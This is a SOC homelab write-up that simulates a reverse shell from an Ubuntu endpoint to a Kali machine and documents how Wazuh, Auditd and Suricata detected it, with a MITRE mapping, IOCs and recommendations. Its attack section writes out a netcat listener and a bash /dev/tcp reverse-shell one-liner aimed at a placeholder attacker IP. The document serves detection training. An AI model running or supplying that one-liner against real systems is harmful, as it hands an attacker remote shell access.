# Reverse Shell Detection

## Objective

Detect and investigate reverse shell activity originating from a monitored Linux endpoint using Wazuh SIEM and supporting endpoint telemetry.

---

## Overview

A reverse shell attack was simulated from a monitored Ubuntu endpoint to a Kali Linux attacker machine. The objective of this use case was to validate the ability of the SOC environment to identify suspicious shell execution and outbound attacker-controlled connections.

The activity was analyzed through Wazuh alerts, Linux logs, process activity, and network connections.

---

## Lab Environment

| Component | Purpose |
|---|---|
| Kali Linux | Attacker Machine |
| Ubuntu Server | Victim Endpoint |
| Wazuh Manager | SIEM & Alert Correlation |
| Auditd | Linux Auditing |
| Suricata | Network Monitoring |

---

## Attack Simulation

### Step 1 — Start Listener on Kali

```bash
nc -lvnp 4444
```

---

### Step 2 — Execute Reverse Shell on Target

```bash
bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1
```

---

## Detection Sources

The following telemetry sources contributed to detection visibility:

- Wazuh SIEM
- Linux process activity
- Auditd logs
- Network connection logs
- Suricata network alerts

---

## Detection Logic

The reverse shell activity generated indicators including:

- Suspicious bash process execution
- Outbound TCP connection to attacker-controlled host
- Interactive shell behavior
- Unauthorized remote command execution

Wazuh correlated these events and generated security alerts associated with shell execution and suspicious network activity.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | Command and Scripting Interpreter | T1059 |
| Execution | Unix Shell | T1059.004 |
| Command and Control | Non-Application Layer Protocol | T1095 |
| Command and Control | Application Layer Protocol | T1071 |

---

## Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Source IP | Attacker IP |
| Destination Port | 4444 |
| Protocol | TCP |
| Process | bash |
| Shell Type | Interactive Reverse Shell |

---

## Investigation Workflow

The investigation process included:

1. Identification of suspicious shell execution
2. Verification of outbound network connection
3. Correlation of process and network activity
4. Validation of attacker-controlled session
5. Collection of evidence and alert analysis

---

## Evidence Collection

### Reverse Shell Execution
(Add Screenshot)

### Kali Listener Session
(Add Screenshot)

### Wazuh Alerts
(Add Screenshot)

### MITRE ATT&CK Mapping
(Add Screenshot)

### Network Connection Verification

```bash
ss -antp
```

(Add Screenshot)

### Process Verification

```bash
ps aux
```

(Add Screenshot)

---

## Findings

The simulated reverse shell successfully established an outbound connection from the monitored endpoint to the attacker machine.

The activity demonstrated characteristics commonly associated with command-and-control behavior, including remote shell execution and interactive command access.

Wazuh successfully generated alerts associated with suspicious shell activity and network behavior.

---

## Security Impact

Reverse shells can provide attackers with persistent remote access to compromised systems, enabling:

- Command execution
- Lateral movement
- Privilege escalation
- Data exfiltration
- Persistence establishment

Detection of such activity is critical for SOC visibility and incident response operations.

---

## Recommendations

To strengthen detection and prevention capabilities, the following improvements are recommended:

- Implement Sysmon for Linux for enhanced process telemetry
- Create custom Wazuh rules for reverse shell detection
- Monitor outbound connections to uncommon ports
- Restrict unauthorized outbound traffic using firewall rules
- Implement EDR-based behavioral monitoring
- Correlate shell execution with network activity

---

## Conclusion

This use case demonstrated the successful detection and investigation of reverse shell activity within the SOC homelab environment using Wazuh SIEM, Linux auditing, and network telemetry sources.